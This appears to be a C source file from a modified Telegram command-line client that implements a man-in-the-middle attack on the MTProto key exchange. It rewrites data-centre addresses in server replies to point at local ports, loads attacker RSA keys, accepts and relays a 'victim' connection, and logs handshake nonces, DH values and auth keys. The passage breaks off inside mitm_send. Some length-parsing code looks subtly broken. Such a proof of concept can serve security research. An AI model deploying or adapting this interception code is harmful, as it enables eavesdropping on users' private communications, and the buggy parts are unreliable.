/*
    This file is part of telegram-client.

    Telegram-client is free software: you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation, either version 2 of the License, or
    (at your option) any later version.

    Telegram-client is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.

    You should have received a copy of the GNU General Public License
    along with this telegram-client.  If not, see <http://www.gnu.org/licenses/>.

    Copyright Nikolay Durov, Andrey Lopatin 2012-2013
    Copyright Vitaly Valtman 2013
*/

#ifdef HAVE_CONFIG_H
#include "config.h"
#endif

#define        _FILE_OFFSET_BITS        64

#include <assert.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <signal.h>
#include <unistd.h>
#include <fcntl.h>
#ifdef __FreeBSD__
#include <sys/endian.h>
#endif
#include <sys/types.h>
#include <netdb.h>
#include <openssl/rand.h>
#include <openssl/rsa.h>
#include <openssl/pem.h>
#include <openssl/sha.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <poll.h>
#include <errno.h>

#include "telegram.h"
#include "net.h"
#include "include.h"
#include "queries.h"
#include "loop.h"
#include "interface.h"
#include "structures.h"
#include "binlog.h"
#include "mtproto-client.h"

#if defined(__FreeBSD__)
#define __builtin_bswap32(x) bswap32(x)
#endif

#define sha1 SHA1

#include "mtproto-common.h"

#define MAX_NET_RES        (1L << 16)
extern int log_level;

// 95.142.192.66
static const int DC1IP[4] = { 0x2e35390d,
			      0x3234312e,
			      0x3239312e,
			      0x00003636};

// 174.140.142.6
static const int DC2IP[4] = { 0x3437310d,
			      0x3034312e,
			      0x3234312e,
			      0x0000362e};

// "31.210.235.12"
static const int DC3IP[4] = { 0x2e31330d,
			      0x2e303132,
			      0x2e353332,
			      0x00003231};

// 116.51.22.2
static const int DC4IP[3] = { 0x3631310b,
			      0x2e31352e,
                              0x322e3232};

// 109.239.131.193
static const int DC5IP[4] = { 0x3930310f,
			      0x3933322e,
			      0x3133312e,
			      0x3339312e};

// 173.230.1.5
static const int DC6IP[3] = { 0x3337310b,
			      0x3034322e,
			      0x312e352e};

// 127.0.0.1
static const int MITMIP[12] = { 0x37323109,
				0x302e302e,
				0x0000312e};

static const int MITMPORT1 = 65521;
static const int MITMPORT2 = 65522;
static const int MITMPORT3 = 65523;
static const int MITMPORT4 = 65524;
static const int MITMPORT5 = 65525;
static const int MITMPORT6 = 65526;

int verbosity, pocverbosity;
int auth_success;
enum dc_state c_state;
char nonce[256];
char new_nonce[256];
char server_nonce[256];
extern int binlog_enabled;
extern int disable_auto_accept;
extern int allow_weak_random;

int total_packets_sent;
long long total_data_sent;

int rpc_execute (struct connection *c, int op, int len);
int rpc_becomes_ready (struct connection *c);
int rpc_close (struct connection *c);

struct connection_methods auth_methods = {
  .execute = rpc_execute,
  .ready = rpc_becomes_ready,
  .close = rpc_close
};

long long precise_time;

long long mitm_session_id=-1;
int mitm_fd, mitm_victim_fd, mitm_port, mitm_capture_session_id=0;
extern FILE *log_net_f;

int _print_auth_key_id(FILE *fd, long long auth_key_id) {

  unsigned int i;

  for(i=0; i<sizeof(long long); i++) {
    fprintf(fd, " %02x", (unsigned int) (0xFF & (auth_key_id >> i)));
  }
  fprintf(fd, "\n");
  return 0;

}

static int _print_enc_message(FILE *fd, struct encrypted_message *enc) {

  int i;

  if(!fd || !enc) {
    fprintf(stderr, "%s\n", strerror(EINVAL));
    return 1;
  }

  fprintf(fd, "HEADER: \n");
  fprintf(fd, "auth_key_id:"); _print_auth_key_id(stdout, enc->auth_key_id);
  fprintf(fd, "    msg_key:"); for(i=0;i<16;i++) fprintf(fd, " %02x", 0xFF & enc->msg_key[i]); fprintf(fd, "\n");
  fprintf(fd, "server_salt: %lld\n", enc->server_salt);
  fprintf(fd, " session_id: %lld\n", enc->session_id);
  fprintf(fd, "     msg_id: %lld\n", enc->msg_id);
  fprintf(fd, "     seq_no: %d\n", enc->seq_no);
  fprintf(fd, "    msg_len: %d\n", enc->msg_len);
  fprintf(fd, "DATA:\n");
  hexdump(enc->message, enc->message + enc->msg_len/4);
  fprintf(fd, "\n");

  return 0;

}

static int _print_auth_msg_header(FILE *fd, unsigned char *data, int offset) {

  int i;

  fprintf(fd, "HEADER:\n");
  //  fprintf(fd, "        size: %02x %02x\n", data[0], data[1]);
  fprintf(fd, "    auth_key:"); for(i=0+offset; i<8+offset; i++) fprintf(fd, " %02x", data[i]); fprintf(fd, "\n");
  fprintf(fd, "   timestamp:"); for(i=8+offset; i<16+offset; i++) fprintf(fd, " %02x", data[i]); fprintf(fd, "\n");
  fprintf(fd, "  msg_length:"); for(i=16+offset; i<20+offset; i++) fprintf(fd, " %02x", data[i]); fprintf(fd, "\n");
  fprintf(fd, "     TL code:"); for(i=20+offset; i<24+offset; i++) fprintf(fd, " %02x", data[i]); fprintf(fd, "\n");
  fprintf(fd, "\n");
  return 0;

}

static int _print_req_pq_message(FILE *fd, unsigned char *data, int offset) {

  int i;

  if(!fd || !data) {
    fprintf(stderr, "%s\n", strerror(EINVAL));
    return 1;
  }

  fprintf(fd, "-----------------------\n");
  fprintf(fd, "req_pq:\n");
  fprintf(fd, "-----------------------\n");
  _print_auth_msg_header(fd, data, offset);
  fprintf(fd, "DATA:\n");
  fprintf(fd, "       nonce:"); for(i=24+offset; i<40+offset; i++) fprintf(fd, " %02x", data[i]); fprintf(fd, "\n");
  fprintf(fd, "\n");

  return 0;

}

static int _print_respq_message(FILE *fd, unsigned char *data, int offset) {

  int i;

  if(!fd || !data) {
    fprintf(stderr, "%s\n", strerror(EINVAL));
    return 1;
  }

  fprintf(fd, "-----------------------\n");
  fprintf(fd, "respq:\n");
  fprintf(fd, "-----------------------\n");
  _print_auth_msg_header(fd, data, offset);
  fprintf(fd, "       nonce:"); for(i=24+offset; i<40+offset; i++) fprintf(fd, " %02x", data[i]); fprintf(fd, "\n");
  fprintf(fd, "server_nonce:"); for(i=40+offset; i<56+offset; i++) fprintf(fd, " %02x", data[i]); fprintf(fd, "\n");
  fprintf(fd, "          pq:"); for(i=56+offset; i<68+offset; i++) fprintf(fd, " %02x", data[i]); fprintf(fd, "\n");
  fprintf(fd, "   vector.TL:"); for(i=68+offset; i<72+offset; i++) fprintf(fd, " %02x", data[i]); fprintf(fd, "\n");
  fprintf(fd, "vector.count:"); for(i=72+offset; i<76+offset; i++) fprintf(fd, " %02x", data[i]); fprintf(fd, "\n");
  fprintf(fd, " fingerprint:"); for(i=76+offset; i<84+offset; i++) fprintf(fd, " %02x", data[i]); fprintf(fd, "\n");

  return 0;

}

static int _print_req_dh_message(FILE *fd, unsigned char *data, int offset) {

  int i;

  if(!fd || !data) {
    fprintf(stderr, "%s\n", strerror(EINVAL));
    return 1;
  }

  fprintf(fd, "-----------------------\n");
  fprintf(fd, "req_dh_params:\n");
  fprintf(fd, "-----------------------\n");
  _print_auth_msg_header(fd, data, offset);
  fprintf(fd, "         nonce:"); for(i=24+offset; i<40+offset; i++) fprintf(fd, " %02x", data[i]); fprintf(fd, "\n");
  fprintf(fd, "  server_nonce:"); for(i=40+offset; i<56+offset; i++) fprintf(fd, " %02x", data[i]); fprintf(fd, "\n");
  fprintf(fd, "             p:"); for(i=56+offset; i<64+offset; i++) fprintf(fd, " %02x", data[i]); fprintf(fd, "\n");
  fprintf(fd, "             q:"); for(i=64+offset; i<72+offset; i++) fprintf(fd, " %02x", data[i]); fprintf(fd, "\n");
  fprintf(fd, "   fingerprint:"); for(i=72+offset; i<80+offset; i++) fprintf(fd, " %02x", data[i]); fprintf(fd, "\n");

  return 0;

}

static int _print_req_dh_dec_data(FILE *fd, unsigned char *data, int offset) {

  int i;

  if(!fd || !data) {
    fprintf(stderr, "%s\n", strerror(EINVAL));
    return 1;
  }

  fprintf(fd, "\nDEC(p_q_inner_data):\n");
  fprintf(fd, "\t          sha1:"); for(i=0+offset; i<20+offset; i++) fprintf(fd, " %02x", data[i]); fprintf(fd, "\n");
  fprintf(fd, "\tp_q_inner_data:"); for(i=20+offset; i<24+offset; i++) fprintf(fd, " %02x", data[i]); fprintf(fd, "\n");
  fprintf(fd, "\t            pq:"); for(i=24+offset; i<36+offset; i++) fprintf(fd, " %02x", data[i]); fprintf(fd, "\n");
  fprintf(fd, "\t             p:"); for(i=36+offset; i<44+offset; i++) fprintf(fd, " %02x", data[i]); fprintf(fd, "\n");
  fprintf(fd, "\t             q:"); for(i=44+offset; i<52+offset; i++) fprintf(fd, " %02x", data[i]); fprintf(fd, "\n");
  fprintf(fd, "\t         nonce:"); for(i=52+offset; i<68+offset; i++) fprintf(fd, " %02x", data[i]); fprintf(fd, "\n");
  fprintf(fd, "\t  server_nonce:"); for(i=68+offset; i<84+offset; i++) fprintf(fd, " %02x", data[i]); fprintf(fd, "\n");
  fprintf(fd, "\t     new_nonce:"); for(i=84+offset; i<116+offset; i++) fprintf(fd, " %02x", data[i]); fprintf(fd, "\n");

  return 0;

}

static int _print_server_dh_params_ok_message(FILE *fd, unsigned char *data, int offset) {

  int i;

  if(!fd || !data) {
    fprintf(stderr, "%s\n", strerror(EINVAL));
    return 1;
  }

  fprintf(fd, "-----------------------\n");
  fprintf(fd, "server_dh_params_ok:\n");
  fprintf(fd, "-----------------------\n");
  _print_auth_msg_header(fd, data, offset);
  fprintf(fd, "         nonce:"); for(i=24+offset; i<40+offset; i++) fprintf(fd, " %02x", data[i]); fprintf(fd, "\n");
  fprintf(fd, "  server_nonce:"); for(i=40+offset; i<56+offset; i++) fprintf(fd, " %02x", data[i]); fprintf(fd, "\n");
  return 0;

}

static int _print_server_dh_params_ok_dec_data(FILE *fd, unsigned char *data, int offset) {

  int i;

  if(!fd || !data) {
    fprintf(stderr, "%s\n", strerror(EINVAL));
    return 1;
  }

  fprintf(fd, "\nDEC(server_DH_inner_data):\n");
  fprintf(fd, "\t          sha1:"); for(i=0+offset; i<20+offset; i++) fprintf(fd, " %02x", data[i]); fprintf(fd, "\n");
  fprintf(fd, "\tserver_DH_inner_data:"); for(i=20+offset; i<24+offset; i++) fprintf(fd, " %02x", data[i]); fprintf(fd, "\n");
  fprintf(fd, "\t         nonce:"); for(i=24+offset; i<40+offset; i++) fprintf(fd, " %02x", data[i]); fprintf(fd, "\n");
  fprintf(fd, "\t  server_nonce:"); for(i=40+offset; i<56+offset; i++) fprintf(fd, " %02x", data[i]); fprintf(fd, "\n");
  fprintf(fd, "\t             g:"); for(i=56+offset; i<60+offset; i++) fprintf(fd, " %02x", data[i]); fprintf(fd, "\n");
  fprintf(fd, "\t  [fixed data]:"); for(i=60+offset; i<64+offset; i++) fprintf(fd, " %02x", data[i]); fprintf(fd, "\n");
  fprintf(fd, "\t      dh_prime:"); for(i=64+offset; i<224+offset; i++) fprintf(fd, " %02x", data[i]); fprintf(fd, "\n");
  fprintf(fd, "\t           g_a:"); for(i=224+offset; i<484+offset; i++) fprintf(fd, " %02x", data[i]); fprintf(fd, "\n");

  return 0;

}

static int _print_set_client_DH_params_message(FILE *fd, unsigned char *data, int offset) {

  int i;

  if(!fd || !data) {
    fprintf(stderr, "%s\n", strerror(EINVAL));
    return 1;
  }

  fprintf(fd, "-----------------------\n");
  fprintf(fd, "set_client_DH_params:\n");
  fprintf(fd, "-----------------------\n");
  _print_auth_msg_header(fd, data, offset);
  fprintf(fd, "         nonce:"); for(i=24+offset; i<40+offset; i++) fprintf(fd, " %02x", data[i]); fprintf(fd, "\n");
  fprintf(fd, "  server_nonce:"); for(i=40+offset; i<56+offset; i++) fprintf(fd, " %02x", data[i]); fprintf(fd, "\n");
  return 0;

}

static int _print_set_client_DH_params_dec_data(FILE *fd, unsigned char *data, int offset) {

  int i;

  if(!fd || !data) {
    fprintf(stderr, "%s\n", strerror(EINVAL));
    return 1;
  }

  fprintf(fd, "\nDEC(client_DH_inner_data):\n");
  fprintf(fd, "\t          sha1:"); for(i=0+offset; i<20+offset; i++) fprintf(fd, " %02x", data[i]); fprintf(fd, "\n");
  fprintf(fd, "\tclient_DH_inner_data:"); for(i=20+offset; i<24+offset; i++) fprintf(fd, " %02x", data[i]); fprintf(fd, "\n");
  fprintf(fd, "\t         nonce:"); for(i=24+offset; i<40+offset; i++) fprintf(fd, " %02x", data[i]); fprintf(fd, "\n");
  fprintf(fd, "\t  server_nonce:"); for(i=40+offset; i<56+offset; i++) fprintf(fd, " %02x", data[i]); fprintf(fd, "\n");
  fprintf(fd, "\t      retry_id:"); for(i=56+offset; i<64+offset; i++) fprintf(fd, " %02x", data[i]); fprintf(fd, "\n");
  fprintf(fd, "\t  [fixed data]:"); for(i=64+offset; i<68+offset; i++) fprintf(fd, " %02x", data[i]); fprintf(fd, "\n");
  fprintf(fd, "\t           g_b:"); for(i=68+offset; i<328+offset; i++) fprintf(fd, " %02x", data[i]); fprintf(fd, "\n");

  return 0;

}

static int _print_auth_ok_message(FILE *fd, unsigned char *data, int offset) {

  int i;

  if(!fd || !data) {
    fprintf(stderr, "%s\n", strerror(EINVAL));
    return 1;
  }

  fprintf(fd, "-----------------------\n");
  fprintf(fd, "auth_ok:\n");
  fprintf(fd, "-----------------------\n");
  _print_auth_msg_header(fd, data, offset);
  fprintf(fd, "         nonce:"); for(i=24+offset; i<40+offset; i++) fprintf(fd, " %02x", data[i]); fprintf(fd, "\n");
  fprintf(fd, "  server_nonce:"); for(i=40+offset; i<56+offset; i++) fprintf(fd, " %02x", data[i]); fprintf(fd, "\n");
  fprintf(fd, "\tnew_nonce_hash1:"); for(i=56+offset; i<72+offset; i++) fprintf(fd, " %02x", data[i]); fprintf(fd, "\n");
  return 0;

}

static int _memmatch(unsigned char *haystack, int hlen, unsigned char *needle, int nlen) {

  int i;

  if(!haystack || hlen <= 0 ||
     !needle || nlen <= 0) {
    fprintf(stderr, "Error: invalid arguments\n");
    return -1;
  }

  for(i=0; i<hlen-nlen; i++) {
    if(!memcmp(haystack + i, needle, nlen))
      return i;
  }

  return -2;

}

int _mitm_switch_dcs(unsigned char *data, int len, int *reduct) {

  int offset, changed, reduced, latest;

  if(!data || len <= 0 || !reduct) {
    fprintf(stderr, "Error: %s\n", strerror(EINVAL));
    return -1;
  }

  changed = 0; reduced = 0; latest = 0;

  /* Look for appearences of each known DC */
  /* if((offset = _memmatch(data, len, (unsigned char *) DC1IP, 12)) > 0) { */
  /*   memcpy(data + offset, MITMIP, 12); */
  /*   memcpy(data + offset + 12, &MITMPORT1, 4); */
  /*   //    memmove(data + offset + 16, data + offset + 20, len - offset - 12); */
  /*   fprintf(stderr, "Match IP1\n"); */
  /*   changed = 1; */
  /*   if(latest < offset + 16) { latest = offset + 16; fprintf(stderr, "offset: %d\n", offset); } */
  /* } */

  if((offset = _memmatch(data, len, (unsigned char *) DC1IP, 16)) > 0) {
    memcpy(data + offset, MITMIP, 12);
    memcpy(data + offset + 12, &MITMPORT1, 4);
    memmove(data + offset + 16, data + offset + 20, len - offset - 16);
    changed = 1; reduced++;
    if(latest < offset + 16) { latest = offset + 16; }
  }

  if((offset = _memmatch(data, len, (unsigned char *) DC2IP, 16)) > 0) {
    memcpy(data + offset, MITMIP, 12);
    memcpy(data + offset + 12, &MITMPORT2, 4);
    memmove(data + offset + 16, data + offset + 20, len - offset - 16);
    changed = 1; reduced++;
    if(latest < offset + 16) { latest = offset + 16; }
  }

  if((offset = _memmatch(data, len, (unsigned char *) DC3IP, 16)) > 0) {
    memcpy(data + offset, MITMIP, 12);
    memcpy(data + offset + 12, &MITMPORT3, 4);
    memmove(data + offset + 16, data + offset + 20, len - offset - 16);
    changed = 1; reduced++;
    if(latest < offset + 16) { latest = offset + 16; }
  }

  if((offset = _memmatch(data, len, (unsigned char *) DC4IP, 12)) > 0) {
    memcpy(data + offset, MITMIP, 12);
    memcpy(data + offset + 12, &MITMPORT4, 4);
    /* memmove(data + offset + 20, data + offset + 24, len - offset - 12); */
    changed = 1;
    if(latest < offset + 16) { latest = offset + 16; }
  }

  if((offset = _memmatch(data, len, (unsigned char *) DC5IP, 16)) > 0) {
    memcpy(data + offset, MITMIP, 12);
    memcpy(data + offset + 12, &MITMPORT5, 4);
    memmove(data + offset + 16, data + offset + 20, len - offset - 16);
    changed = 1; reduced++;
    if(latest < offset + 16) { latest = offset + 16; }
  }

  if((offset = _memmatch(data, len, (unsigned char *) DC6IP, 12)) > 0) {
    memcpy(data + offset, MITMIP, 12);
    memcpy(data + offset + 12, &MITMPORT6, 4);
    changed = 1;
    if(latest < offset + 16) { latest = offset + 16; }
  }

  if(reduced) {
    memmove(data + latest, data + latest + (reduced * 4), len - (4*reduced));
    *reduct = 4*reduced;
  }

  return changed;

}

double get_utime (int clock_id) {
  struct timespec T;
  my_clock_gettime (clock_id, &T);
  double res = T.tv_sec + (double) T.tv_nsec * 1e-9;
  if (clock_id == CLOCK_REALTIME) {
    precise_time = (long long) (res * (1LL << 32));
  }
  return res;
}

void secure_random (void *s, int l) {
  if (RAND_bytes (s, l) < 0) {
    if (allow_weak_random) {
      RAND_pseudo_bytes (s, l);
    } else {
      assert (0 && "End of random. If you want, you can start with -w");
    }
  }
}

#define STATS_BUFF_SIZE        (64 << 10)
int stats_buff_len;
char stats_buff[STATS_BUFF_SIZE];

#define MAX_RESPONSE_SIZE        (1L << 24)

char Response[MAX_RESPONSE_SIZE];
int Response_len;

/*
 *
 *                STATE MACHINE
 *
 */

char *rsa_public_key_name; // = "tg.pub";
RSA *pubKey, *mitm_pubKey, *mitm_prvKey;
long long pk_fingerprint, mitm_pk_fingerprint;

int mitm_rsa_load_public_key (const char *public_key_name) {

  mitm_pubKey = NULL;
  FILE *f = fopen (public_key_name, "r");
  if (f == NULL) {
    logprintf ( "Couldn't open public key file: %s\n", public_key_name);
    return -1;
  }
  mitm_pubKey = PEM_read_RSAPublicKey (f, NULL, NULL, NULL);
  fclose (f);
  if (mitm_pubKey == NULL) {
    logprintf ( "PEM_read_RSAPublicKey returns NULL.\n");
    return -1;
  }

  if (verbosity) {
    logprintf ( "public key '%s' loaded successfully\n", rsa_public_key_name);
  }

  return 0;
}

int mitm_rsa_load_private_key (const char *private_key_name) {

  mitm_prvKey = NULL;
  FILE *f = fopen (private_key_name, "r");
  if (f == NULL) {
    logprintf ("Couldn't open private key file: %s\n", private_key_name);
    return -1;
  }
  mitm_prvKey = PEM_read_RSAPrivateKey (f, NULL, NULL, NULL);
  fclose (f);
  if (mitm_prvKey == NULL) {
    logprintf ("Couldn't open private key file: %s\n", private_key_name);
    return -1;
  }

  if (verbosity) {
    logprintf ("private key '%s' loaded successfully\n", private_key_name);
  }

  return 0;

}

static int rsa_load_public_key (const char *public_key_name) {
  pubKey = NULL;
  FILE *f = fopen (public_key_name, "r");
  if (f == NULL) {
    logprintf ( "Couldn't open public key file: %s\n", public_key_name);
    return -1;
  }
  pubKey = PEM_read_RSAPublicKey (f, NULL, NULL, NULL);
  fclose (f);
  if (pubKey == NULL) {
    logprintf ( "PEM_read_RSAPublicKey returns NULL.\n");
    return -1;
  }

  if (verbosity) {
    logprintf ( "public key '%s' loaded successfully\n", rsa_public_key_name);
  }

  return 0;
}

int auth_work_start (struct connection *c);

/*
 *
 *        UNAUTHORIZED (DH KEY EXCHANGE) PROTOCOL PART
 *
 */

BIGNUM dh_prime, dh_g, g_a, dh_power, auth_key_num, mitm_auth_key_num;
char s_power [256], s_mitm_a [256];
char mitm_auth_key[256];
long long mitm_auth_key_id=-1;

struct {
  long long auth_key_id;
  long long out_msg_id;
  int msg_len;
} unenc_msg_header;


#define ENCRYPT_BUFFER_INTS        16384
int encrypt_buffer[ENCRYPT_BUFFER_INTS];

#define DECRYPT_BUFFER_INTS        16384
int decrypt_buffer[ENCRYPT_BUFFER_INTS];

static void _mitm_set_auth_key_id (unsigned char *buf) {
  static unsigned char sha1_buffer[20];
  SHA1 (buf, 256, sha1_buffer);
  mitm_auth_key_id = *(long long *)(sha1_buffer + 12);
}

int mitm_bind(int port) {

  struct sockaddr_in serv_addr;

  if(!port) {
    return -1;
  }

  /* Create the socket */
  errno = 0;
  if((mitm_fd = socket(AF_INET, SOCK_STREAM, 0)) == -1) {
    fprintf(stderr, "mitm_bind:%d: %s\n", __LINE__, strerror(errno));
    return -1;
  }

  /* Fill the address to bind to */
  bzero((char *) &serv_addr, sizeof(serv_addr));
  serv_addr.sin_family = AF_INET;
  serv_addr.sin_addr.s_addr = INADDR_ANY;
  serv_addr.sin_port = htons(port);

  /* Bind (assign) the created socket to the received port */
  errno = 0;
  if(bind(mitm_fd, (struct sockaddr *) &serv_addr, sizeof(serv_addr)) == -1) {
    fprintf(stderr, "mitm_bind:%d: %s\n", __LINE__, strerror(errno));
    return -1;
  }

  errno = 0;
  if(listen(mitm_fd, 1) == -1) {
    fprintf(stderr, "mitm_bind:%d: %s\n", __LINE__, strerror(errno));
    return -1;
  }

  mitm_port = port;
  if(log_net_f) {
    fprintf (log_net_f, "[MITM] %.02lf MITM socket %d listening at port %d\n",
	     get_utime (CLOCK_REALTIME), mitm_fd, mitm_port);
  }
  fprintf (stderr, "[MITM] %.02lf MITM socket %d listening at port %d\n",
  	   get_utime (CLOCK_REALTIME), mitm_fd, mitm_port);

  return mitm_accept();

}

int mitm_accept() {

  struct sockaddr cli_addr;
  socklen_t cli_len;

  cli_len = sizeof(struct sockaddr);
  if((mitm_victim_fd = accept(mitm_fd, &cli_addr, &cli_len)) == -1) {
    fprintf(stderr, "mitm_bind:%d: %s\n", __LINE__, strerror(errno));
    return -1;
  }

  if(log_net_f) {
    fprintf (log_net_f, "[MITM] %.02lf MITM attending request at socket %d\n",
	     get_utime (CLOCK_REALTIME), mitm_victim_fd);
  }
  fprintf (stderr, "[MITM] %.02lf MITM attending request at socket %d\n",
  	   get_utime (CLOCK_REALTIME), mitm_victim_fd);

  return 0;

}

int mitm_close() {
  return close(mitm_victim_fd);
}

int mitm_recv(int fd, char **buffer, int *size) {

  struct timeval timeout;
  char sz[2048];
  int len;
  ssize_t n, total, toread;

  if(!fd) {
    fprintf(stderr, "mitm_recv:%d: %s\n", __LINE__, strerror(EINVAL));
    return -1;
  }

  /* Set the timeout: sec = 0 means no timeout */
  timeout.tv_sec = 0;
  timeout.tv_usec = 0;

  if(setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, (char *) &timeout,
  		sizeof(timeout)) == -1) {
    return -1;
  }
  
  /* Read data from the new connection */
  toread = 1; /* In the abridged version, except for the first-ever packet,
		 we only need to read 1 byte to know the size */
  total = 0; errno = 0;
  while((n = recv(fd, &sz[0], toread, 0)) >= 0) {
    total += n;
    toread -= n;
    if(!toread) break;
  }

  /* Finish with error */
  if(n == -1) {
    fprintf(stderr, "mitm_recv:%d: %s\n", __LINE__, strerror(errno));
    return -1;
  }

  if(total != 1) {
    fprintf(stderr, "mitm_recv:%d: %s\n", __LINE__, strerror(errno));
    return -1;
  }

  len = 0;

  /* 0xEF means first packet: we still have to read another byte to get the size */
  if((unsigned char) sz[0] == 0xEF) {

    /* Read data from the new connection */
    toread = 1;
    total = 0; errno = 0;
    while((n = recv(fd, &sz[0], toread, 0)) >= 0) {
      total += n;
      toread -= n;
      if(!toread) break;
    }

    /* Finish with error */
    if(n == -1) {
      fprintf(stderr, "mitm_recv:%d: %s\n", __LINE__, strerror(errno));
      return -1;
    }

    if(total != 1) {
      fprintf(stderr, "mitm_recv:%d: %s\n", __LINE__, strerror(errno));
      return -1;
    }

    /* total data length = first byte * 4 */
    len = sz[0]*4;

  } else if((unsigned char) sz[0] == 0x7F) {

    /* Read data from the new connection */
    toread = 3;
    total = 0; errno = 0;
    while((n = recv(fd, sz, toread, 0)) >= 0) {
      total += n;
      toread -= n;
      if(!toread) break;
    }

    /* Finish with error */
    if(n == -1) {
      fprintf(stderr, "mitm_recv:%d: %s\n", __LINE__, strerror(errno));
      return -1;
    }

    if(total != 3) {
      fprintf(stderr, "mitm_recv:%d: %s\n", __LINE__, strerror(errno));
      return -1;
    }

    /* total data length = 3 bytes in little endian / 4 */
    len = (sz[0] + (sz[1] >> 8) + (sz[2] >> 16))/4;    

  } else {

    /* total data length = first byte * 4 */
    len = sz[0]*4;

  }

  *buffer = (char *) malloc(sizeof(char)*len);
  memset(*buffer, 0, len);

  toread = len;
  total = 0;
  errno = 0;
  while((n = recv(fd, *buffer, toread, 0)) >= 0) {
    total += n;
    toread -= n;
    if(!toread) break;
  }

  /* Finish with error */
  if(n == -1) {
    fprintf(stderr, "mitm_recv:%d: %s\n", __LINE__, strerror(errno));
    return -1;
  }

  if(total != len) {
    fprintf(stderr, "mitm_recv:%d: %s\n", __LINE__, strerror(errno));
    return -1;
  }

#ifdef DEBUG  

  if(log_net_f) {
    if(fd == mitm_victim_fd) {
      fprintf (log_net_f, "[VICTIM - MITM] %.02lf %d IN %d %02x ", get_utime (CLOCK_REALTIME), len, mitm_port, sz[0]);
    } else {
      fprintf (log_net_f, "[TELEGRAM - MITM] %.02lf %d IN %d %02x ", get_utime (CLOCK_REALTIME), len, mitm_port, sz[0]);
    }
  }

  {
    
    int i;
    unsigned char *buff = (unsigned char *) *buffer;
    
    if(log_net_f) {
      for (i = 0; i < len; i++) {
	fprintf (log_net_f, " %02x", 0xFF & *(buff+i));
      }
      fprintf (log_net_f, "\n");
      fflush (log_net_f);
    }

  }
#endif

  *size = len;

  return len;  

}

/* The same as mitm_recv, but stores the size field in "size", of
    size_len bytes. */
int mitm_recv_with_size(int fd, char **buffer, int *len, char *size, int *size_len) {

  struct timeval timeout;
  char sz[2048];
  int _len;
  ssize_t n, total, toread;

  if(!buffer || !len || !size || !size_len) {
    return -1;
  }

  if(!fd) {
    fprintf(stderr, "mitm_recv_with_size:%d: %s\n", __LINE__, strerror(EINVAL));
    return -1;
  }

  /* Set the timeout: sec = 0 means no timeout */
  timeout.tv_sec = 0;
  timeout.tv_usec = 0;

  if(setsockopt(fd, SOL_SOCKET, SO_RCVTIMEO, (char *) &timeout,
  		sizeof(timeout)) == -1) {
    return -1;
  }
  
  /* Read data from the new connection */
  toread = 1; /* In the abridged version, except for the first-ever packet,
		 we only need to read 1 byte to know the size */
  total = 0; errno = 0;
  while((n = recv(fd, &sz[0], toread, 0)) >= 0) {
    total += n;
    toread -= n;
    if(!toread) break;
  }

  /* Finish with error */
  if(n == -1) {
    fprintf(stderr, "mitm_recv:%d: %s\n", __LINE__, strerror(errno));
    return -1;
  }

  if(total != 1) {
    fprintf(stderr, "mitm_recv:%d: %s\n", __LINE__, strerror(errno));
    return -1;
  }

  _len = 0;

  /* 0xEF means first packet: we still have to read another byte to get the size */
  if((unsigned char) sz[0] == 0xEF) {

    /* Read data from the new connection */
    toread = 1;
    total = 0; errno = 0;
    while((n = recv(fd, &sz[0], toread, 0)) >= 0) {
      total += n;
      toread -= n;
      if(!toread) break;
    }

    /* Finish with error */
    if(n == -1) {
      fprintf(stderr, "mitm_recv:%d: %s\n", __LINE__, strerror(errno));
      return -1;
    }

    if(total != 1) {
      fprintf(stderr, "mitm_recv:%d: %s\n", __LINE__, strerror(errno));
      return -1;
    }

    /* total data length = first byte * 4 */
    _len = sz[0]*4;
    size[0] = sz[0];
    *size_len = 1;

  } else if((unsigned char) sz[0] == 0x7F) {

    /* Read data from the new connection */
    toread = 3;
    total = 0; errno = 0;
    while((n = recv(fd, sz, toread, 0)) >= 0) {
      total += n;
      toread -= n;
      if(!toread) break;
    }

    /* Finish with error */
    if(n == -1) {
      fprintf(stderr, "mitm_recv:%d: %s\n", __LINE__, strerror(errno));
      return -1;
    }

    if(total != 3) {
      fprintf(stderr, "mitm_recv:%d: %s\n", __LINE__, strerror(errno));
      return -1;
    }

    /* total data length = 3 bytes in little endian / 4 */
    _len = (sz[0] + (sz[1] >> 8) + (sz[2] >> 16))/4;  
    size[0] = sz[0]; size[1] = size[1]; size[2] = size[2];
    *size_len = 3;
  } else {

    /* total data length = first byte * 4 */
    _len = sz[0]*4;
    size[0] = sz[0];
    *size_len = 1;

  }

  *buffer = (char *) malloc(sizeof(char)*_len);
  memset(*buffer, 0, _len);

  toread = _len;
  total = 0;
  errno = 0;
  while((n = recv(fd, *buffer, toread, 0)) >= 0) {
    total += n;
    toread -= n;
    if(!toread) break;
  }

  /* Finish with error */
  if(n == -1) {
    fprintf(stderr, "mitm_recv:%d: %s\n", __LINE__, strerror(errno));
    return -1;
  }

  if(total != _len) {
    fprintf(stderr, "mitm_recv:%d: %s\n", __LINE__, strerror(errno));
    return -1;
  }

#ifdef DEBUG  

  if(log_net_f) {
    if(fd == mitm_victim_fd) {
      fprintf (log_net_f, "[VICTIM - MITM] %.02lf %d IN %d %02x ", get_utime (CLOCK_REALTIME), _len, mitm_port, sz[0]);
    } else {
      fprintf (log_net_f, "[TELEGRAM - MITM] %.02lf %d IN %d %02x ", get_utime (CLOCK_REALTIME), _len, mitm_port, sz[0]);
    }
  }

  {
    int i;
    unsigned char *buff = (unsigned char *) *buffer;
    
    if(log_net_f) {
      for (i = 0; i < _len; i++) {
	fprintf (log_net_f, " %02x", 0xFF & *(buff+i));
      }
      fprintf (log_net_f, "\n");
      fflush (log_net_f);
    }
  }
#endif

  *len = _len;

  return _len;  
  
}

int mitm_send(int fd, char *buffer, int size) {

  ssize_t n;

  if (!buffer || !fd) return -1;

  /* Write the data into the socket */
  if((n = send(fd, buffer, size, 0)) == (ssize_t) -1) {
    fprintf(stderr, "Error sending data to VICTIM\n");
    return -1;
  }

  /* If we've been unable to write all the bytes: error */
  if (n != size) {
    fprintf(stderr, "Sent wrong data to VICTIM\n");
    return -1;
  }

#ifdef DEBUG  

  if(log_net_f) {
    if(fd == mitm_victim_fd) {
